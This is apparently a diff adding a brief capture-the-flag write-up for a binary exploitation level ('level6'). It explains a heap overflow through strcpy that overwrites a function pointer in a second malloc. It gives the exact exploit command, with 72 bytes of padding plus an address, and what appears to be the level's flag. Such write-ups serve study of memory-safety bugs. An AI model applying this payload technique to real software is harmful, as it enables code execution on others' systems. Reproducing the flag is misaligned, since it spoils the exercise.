@@ -1,0 +1,15 @@
+they take adress in the seconde malloc and call it 
+so two malloc of same size range are usually followed
+
+strcpy can overflow.
+if we give it a string enough long, we can write on the second malloc through strcpy.
+
+
+first malloc size of 64
+second malloc size of 4
+start copy at -4
+
+
+./level6 $(python -c 'print "C" * 72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
